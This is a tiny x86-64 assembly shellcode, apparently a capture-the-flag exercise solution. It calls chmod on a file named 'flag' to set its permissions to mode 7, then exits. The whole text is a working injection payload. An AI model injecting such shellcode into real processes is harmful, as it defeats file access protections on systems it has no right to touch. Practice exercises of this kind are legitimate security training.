.intel_syntax noprefix

int3
mov al, 90
mov rbx, 0x67616c66
push rbx
push rsp
pop rdi
xor rsi, rsi
mov sil, 7
syscall

mov al, 60
xor rdi, rdi
syscall